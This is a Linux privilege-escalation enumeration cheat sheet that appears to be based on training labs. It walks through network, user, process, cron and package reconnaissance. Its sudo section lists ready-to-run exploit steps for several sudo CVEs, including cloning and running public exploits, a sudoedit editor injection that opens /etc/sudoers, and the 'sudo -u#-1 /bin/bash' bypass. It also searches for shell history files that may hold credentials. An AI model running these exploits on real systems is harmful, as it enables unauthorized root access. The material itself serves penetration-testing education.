# Service Abuse

### Overview

**Services and Internals Enumeration** involves systematic reconnaissance of system services, network configuration, user activity, installed software, and running processes to identify privilege escalation vectors. This phase maps the internal state of the Linux system to discover misconfigurations, vulnerable services, and security weaknesses.

**Key Areas:**

* Network interfaces and connections
* User login activity and command history
* Running services and listening ports
* Scheduled tasks (cron jobs)
* Installed packages and vulnerable versions
* System binaries and GTFOBins candidates
* Configuration files and scripts

***

### Exploitation Workflow Summary

1. Network Reconnaissance ├─ Map network interfaces ├─ Check listening services ├─ Review hosts file └─ Identify internal services
2. User Activity Analysis ├─ Check logged-in users ├─ Review login history ├─ Examine command history └─ Find history files
3. Service Enumeration ├─ List running processes ├─ Identify root-owned services ├─ Check cron jobs └─ Examine /proc for details
4. Software Assessment ├─ List installed packages ├─ Check sudo version ├─ Identify vulnerable binaries └─ Search GTFOBins candidates
5. Configuration Review ├─ Find configuration files ├─ Locate scripts └─ Trace system calls

***

### Network Enumeration

**Check network interfaces:**

```bash
ip a
```

**Expected output:**

```
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536
    inet 127.0.0.1/8 scope host lo
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500
    inet 10.10.10.15/24 brd 10.10.10.255 scope global eth0
3: docker0: <NO-CARRIER,BROADCAST,MULTICAST,UP> mtu 1500
    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0
```

**Alternative:**

```bash
ifconfig
ip addr show
```

**Check hosts file:**

```bash
cat /etc/hosts
```

**Expected output:**

```
127.0.0.1       localhost
10.10.10.15     target.local
192.168.1.100   internal-db.company.local
192.168.1.200   admin-panel.company.local
```

**List listening services:**

```bash
netstat -tulpn
```

**Expected output:**

```
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      1234/sshd
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      5678/mysqld
tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN      9012/java
```

**Alternative:**

```bash
ss -tulpn
lsof -i
```

***

### User Activity Analysis

**Check last login times:**

```bash
lastlog
```

**Expected output:**

```
Username         Port     From             Latest
root                                       Never logged in
mrb3n            pts/1    10.10.14.15      Tue Aug  2 19:33:16 +0000 2022
bjones                                     Never logged in
administrator                              Never logged in
cliff.moore      pts/0    127.0.0.1        Tue Aug  2 19:32:29 +0000 2022
stacey.jenkins   pts/0    10.10.14.15      Tue Aug  2 18:29:15 +0000 2022
htb-student      pts/0    10.10.14.15      Wed Aug  3 13:37:22 +0000 2022
```

**Check currently logged-in users:**

```bash
w
```

**Expected output:**

```
 12:27:21 up 1 day, 16:55,  1 user,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
cliff.mo pts/0    10.10.14.16      Tue19   40:54m  0.02s  0.02s -bash
```

**Alternative:**

```bash
who
users
```

**View command history:**

```bash
history
```

**Expected output:**

```
    1  id
    2  cd /home/cliff.moore
    3  exit
    4  touch backup.sh
    5  tail /var/log/apache2/error.log
    6  ssh ec2-user@dmz02.inlanefreight.local
    7  history
```

**Find all history files:**

```bash
find / -type f \( -name *_hist -o -name *_history \) -exec ls -l {} \; 2>/dev/null
```

**Expected output:**

```
-rw------- 1 root root 2048 Dec 20 10:00 /root/.bash_history
-rw------- 1 user user 1024 Dec 19 15:30 /home/user/.bash_history
-rw------- 1 user user  512 Dec 18 09:00 /home/user/.mysql_history
-rw------- 1 admin admin 768 Dec 17 14:00 /home/admin/.psql_history
```

***

### Process and Service Enumeration

**List all processes:**

```bash
ps aux
```

**List processes by user:**

```bash
ps aux | grep root
```

**Expected output:**

```
root      1234  0.0  0.1  12345  2345 ?  Ss   10:00   0:00 /usr/sbin/sshd
root      5678  0.0  0.2  23456  3456 ?  Ssl  10:01   0:05 /usr/sbin/mysqld
root      9012  0.5  5.0 156789 45678 ?  Sl   10:02   1:23 /usr/bin/java
```

**Process tree:**

```bash
ps auxf
pstree -p
```

**Find process details in /proc:**

```bash
find /proc -name cmdline -exec cat {} \; 2>/dev/null | tr " " "\n"
```

**Expected output:**

```
/usr/sbin/apache2
-k
start
/usr/bin/mysql
--defaults-file=/etc/mysql/my.cnf
/opt/app/server.py
--config=/opt/app/config.ini
```

***

### Cron Job Enumeration

**System cron jobs:**

```bash
cat /etc/crontab
```

**Expected output:**

```
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

0 2 * * * root /usr/local/bin/backup.sh
30 3 * * * root /opt/scripts/cleanup.py
*/5 * * * * root /usr/bin/monitor.sh
```

**Cron directories:**

```bash
ls -la /etc/cron.daily/
ls -la /etc/cron.hourly/
ls -la /etc/cron.weekly/
ls -la /etc/cron.monthly/
```

**Expected output:**

```
-rwxr-xr-x 1 root root  311 May 29  2017 0anacron
-rwxr-xr-x 1 root root 1478 Apr 20  2018 apt-compat
-rwxrwxrwx 1 root root  123 Dec 20 10:00 backup
-rwxr-xr-x 1 root root  256 Jan 15  2019 logrotate
```

**User cron jobs:**

```bash
crontab -l
cat /var/spool/cron/crontabs/*
```

***

### Sudo Version Analysis

**Check sudo version:**

```bash
sudo -V
sudo --version
```

**Expected output:**

```
Sudo version 1.8.31
Sudoers policy plugin version 1.8.31
Sudoers file grammar version 46
Sudoers I/O plugin version 1.8.31
```

**Quick vulnerability check:**

```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```

#### CVE-2025-32463 (chwoot)

**Vulnerable:** sudo 1.9.14 - 1.9.17

**Exploit:**

```bash
# Clone and compile
git clone https://github.com/kh4sh3i/CVE-2025-32463
cd CVE-2025-32463
make
./exploit
```

#### CVE-2023-22809 (sudoedit)

**Vulnerable:** sudo 1.8.0 - 1.9.12p1

**Exploit:**

```bash
EDITOR='nano -- /etc/sudoers' sudoedit /etc/motd
```

#### CVE-2021-3156 (Baron Samedit)

**Vulnerable:** sudo 1.8.2 - 1.8.31p2, 1.9.0 - 1.9.5p1

**Exploit:**

```bash
git clone https://github.com/blasty/CVE-2021-3156
cd CVE-2021-3156
make
./sudo-hax-me-a-sandwich 1
```

#### CVE-2019-18634

**Vulnerable:** sudo < 1.8.26

**Exploit:**

```bash
git clone https://github.com/saleemrashid/sudo-cve-2019-18634
cd sudo-cve-2019-18634
make
./exploit
```

#### CVE-2019-14287

**Vulnerable:** sudo < 1.8.28

**Requirements:** User can run command as any user except root

**Check:**

```bash
sudo -l
```

**Output:**

```
(ALL, !root) /bin/bash
```

**Exploit:**

```bash
sudo -u#-1 /bin/bash
```

***

### Installed Packages

**List installed packages (Debian/Ubuntu):**

```bash
apt list --installed | tr "/" " " | cut -d" " -f1,3 | sed 's/[0-9]://g' | tee -a installed_pkgs.list
```

**Alternative:**

```bash
dpkg -l
```

**List installed packages (Red Hat/CentOS):**

```bash
rpm -qa
yum list installed
```

***

### Binary Enumeration

**List binaries:**

```bash
ls -l /bin /usr/bin/ /usr/sbin/
```

**Check for GTFOBins:**

```bash
for i in $(curl -s https://gtfobins.github.io/ | html2text | cut -d" " -f1 | sed '/^[[:space:]]*$/d');do if grep -q "$i" installed_pkgs.list;then echo "Check GTFO for: $i";fi;done
```

**Expected output:**

```
Check GTFO for: vim
Check GTFO for: find
Check GTFO for: perl
Check GTFO for: python
Check GTFO for: tar
```

***

### Configuration Files

**Find configuration files:**

```bash
find / -type f \( -name *.conf -o -name *.config \) -exec ls -l {} \; 2>/dev/null
```

**Expected output:**

```
-rw-r--r-- 1 root root 3028 Dec 20 10:00 /etc/apache2/apache2.conf
-rw-r--r-- 1 root root 1234 Dec 19 15:30 /etc/mysql/my.cnf
-rw-rw-rw- 1 root root  567 Dec 18 09:00 /opt/app/database.config
```

***

### Scripts

**Find shell scripts:**

```bash
find / -type f -name "*.sh" 2>/dev/null | grep -v "src\|snap\|share"
```

**Expected output:**

```
/usr/local/bin/backup.sh
/opt/scripts/cleanup.sh
/home/admin/deploy.sh
```

**Find Python scripts:**

```bash
find / -type f -name "*.py" 2>/dev/null | grep -v "src\|snap\|share"
```

***

### System Call Tracing

**Trace system calls:**

```bash
strace ping -c1 10.10.10.10
```

**Trace file operations:**

```bash
strace -e open,openat ls /root
```

***

### Quick Reference

**Network:**

```bash
ip a
netstat -tulpn
cat /etc/hosts
```

**Users:**

```bash
lastlog
w
history
```

**Services:**

```bash
ps aux | grep root
netstat -tulpn
cat /etc/crontab
```

**Software:**

```bash
sudo -V
dpkg -l
apt list --installed
```

**Files:**

```bash
find / -name "*.conf" 2>/dev/null
find / -name "*.sh" 2>/dev/null
```
